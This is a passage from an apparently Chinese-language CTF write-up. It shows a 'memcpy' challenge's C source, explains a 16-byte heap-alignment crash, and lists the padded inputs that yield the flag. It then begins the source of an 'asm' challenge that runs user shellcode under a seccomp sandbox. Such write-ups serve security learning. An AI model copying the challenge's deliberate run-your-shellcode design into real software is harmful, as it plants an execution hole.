</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// compiled with : gcc -o memcpy memcpy.c -m32 -lm
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;math.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=nf>rdtsc</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>asm</span><span class=p>(</span><span class=s>&#34;rdtsc&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=nf>slow_memcpy</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>len</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>dest</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>src</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=nf>fast_memcpy</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>,</span> <span class=n>size_t</span> <span class=n>len</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=c1>// 64-byte block fast copy
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>len</span><span class=o>&gt;=</span> <span class=mi>64</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>i</span> <span class=o>=</span> <span class=n>len</span> <span class=o>/</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>len</span> <span class=o>&amp;=</span> <span class=p>(</span><span class=mi>64</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>while</span><span class=p>(</span><span class=n>i</span><span class=o>--&gt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=n>__asm__</span> <span class=n>__volatile__</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movdqa (%0), %%xmm0</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movdqa 16(%0), %%xmm1</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movdqa 32(%0), %%xmm2</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movdqa 48(%0), %%xmm3</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movntps %%xmm0, (%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movntps %%xmm1, 16(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movntps %%xmm2, 32(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;movntps %%xmm3, 48(%1)</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>			<span class=o>::</span><span class=s>&#34;r&#34;</span><span class=p>(</span><span class=n>src</span><span class=p>),</span><span class=s>&#34;r&#34;</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=o>:</span><span class=s>&#34;memory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>dest</span> <span class=o>+=</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=n>src</span> <span class=o>+=</span> <span class=mi>64</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// byte-to-byte slow copy
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>len</span><span class=p>)</span> <span class=n>slow_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IOLBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Hey, I have a boring assignment for CS class.. :(</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;The assignment is simple.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;-----------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- What is the best implementation of memcpy?        -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- 1. implement your own slow/fast version of memcpy -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- 2. compare them with various size of data         -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;- 3. conclude your experiment and submit report     -</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;-----------------------------------------------------</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;This time, just help me out with my experiment and get flag</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;No fancy hacking, I promise :D</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>t1</span><span class=p>,</span> <span class=n>t2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>e</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>src</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>dest</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>low</span><span class=p>,</span> <span class=n>high</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=c1>// allocate memory
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>char</span><span class=o>*</span> <span class=n>cache1</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>cache2</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>src</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>size_t</span> <span class=n>sizes</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// setup experiment parameters
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>for</span><span class=p>(</span><span class=n>e</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span> <span class=n>e</span><span class=o>&lt;</span><span class=mi>14</span><span class=p>;</span> <span class=n>e</span><span class=o>++</span><span class=p>){</span>	<span class=c1>// 2^13 = 8K
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>low</span> <span class=o>=</span> <span class=n>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>e</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>high</span> <span class=o>=</span> <span class=n>pow</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>e</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;specify the memcpy amount between %d ~ %d :&#34;</span><span class=p>,</span> <span class=n>low</span><span class=p>,</span> <span class=n>high</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>low</span> <span class=o>||</span> <span class=n>size</span><span class=o>&gt;</span> <span class=n>high</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=n>printf</span><span class=p>(</span><span class=s>&#34;don&#39;t mess with the experiment.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=n>sizes</span><span class=p>[</span><span class=n>i</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok, lets run the experiment with your configuration</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// run experiment
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>for</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>10</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>size</span> <span class=o>=</span> <span class=n>sizes</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;experiment %d : memcpy with buffer size %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>dest</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>memcpy</span><span class=p>(</span><span class=n>cache1</span><span class=p>,</span> <span class=n>cache2</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>);</span>		<span class=c1>// to eliminate cache effect
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>t1</span> <span class=o>=</span> <span class=n>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=n>slow_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>		<span class=c1>// byte-to-byte memcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>t2</span> <span class=o>=</span> <span class=n>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;ellapsed CPU cycles for slow_memcpy : %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>t2</span><span class=o>-</span><span class=n>t1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>memcpy</span><span class=p>(</span><span class=n>cache1</span><span class=p>,</span> <span class=n>cache2</span><span class=p>,</span> <span class=mh>0x4000</span><span class=p>);</span>		<span class=c1>// to eliminate cache effect
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>t1</span> <span class=o>=</span> <span class=n>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=n>fast_memcpy</span><span class=p>(</span><span class=n>dest</span><span class=p>,</span> <span class=n>src</span><span class=p>,</span> <span class=n>size</span><span class=p>);</span>		<span class=c1>// block-to-block memcpy
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=n>t2</span> <span class=o>=</span> <span class=n>rdtsc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;ellapsed CPU cycles for fast_memcpy : %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>t2</span><span class=o>-</span><span class=n>t1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;thanks for helping my experiment!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;flag : ----- erased in this source code -----</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>本题实现了一个针对 64 字节以上的块的快速 <code>memcpy</code> 方法，使用的是 <code>movdqa</code> 和 <code>movntps</code> 两个汇编指令。但是实际运行时，即使按要求输入合法数据，程序也会崩溃。查了 <a href=https://www.felixcloutier.com/x86/movntps target=_blank rel="noopener noreffer">一些资料</a> 后，发现是由于堆分配时字节没有对齐导致的：</p><blockquote><p>The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p></blockquote><p>显然这里是要求目的地址是 16 字节对齐的，换句话说它的十六进制末尾是 0。gdb 调试一下，全部输入最小的合法数据：</p><p><figure><a class=lightgallery href=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png title="图 4" data-thumbnail=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png data-sub-html="<h2> </h2><p>图 4</p>"><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnkrToddler/4.png></a><figcaption class=image-caption>图 4</figcaption></figure></p><p>可以看到段错误的时候，目的寄存器 <code>edx</code> 的末尾并不是 0，因此产生了错误。这不难理解：<code>malloc</code> 进行堆分配时，对于 <code>8</code> 而言分配了 <code>0x8+0x8=0x10</code> 字节，是对齐的；对 <code>16</code> 而言分配了 <code>0x8+0x10=0x18</code> 字节，于是不对齐了，我们可以给它 + 8 来对齐。对于 <code>32</code>，分配 <code>0x8+0x20=0x28</code> 字节，同样不对齐，我们也作同样的 padding 处理，于是我们可以输入数据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>8 24 40 72 136 264 520 1032 2056 4104
</span></span></code></pre></td></tr></table></div></div><p>使得每次 <code>edx</code> 都是对齐的，程序就不会段错误了，最终得到 flag。</p><h2 id=asm>asm</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;seccomp.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/prctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define LENGTH 128
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>sandbox</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>	<span class=n>scmp_filter_ctx</span> <span class=n>ctx</span> <span class=o>=</span> <span class=n>seccomp_init</span><span class=p>(</span><span class=n>SCMP_ACT_KILL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>ctx</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;seccomp error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=n>SCMP_SYS</span><span class=p>(</span><span class=n>open</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=n>SCMP_SYS</span><span class=p>(</span><span class=n>read</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=n>SCMP_SYS</span><span class=p>(</span><span class=n>write</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=n>SCMP_SYS</span><span class=p>(</span><span class=n>exit</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_rule_add</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>SCMP_ACT_ALLOW</span><span class=p>,</span> <span class=n>SCMP_SYS</span><span class=p>(</span><span class=n>exit_group</span><span class=p>),</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>seccomp_load</span><span class=p>(</span><span class=n>ctx</span><span class=p>)</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>seccomp_release</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;seccomp error</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>seccomp_release</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>stub</span><span class=p>[]</span> <span class=o>=</span><span class=s>&#34;</span><span class=se>\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>filter</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IONBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>_IOLBF</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Welcome to shellcoding practice challenge.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
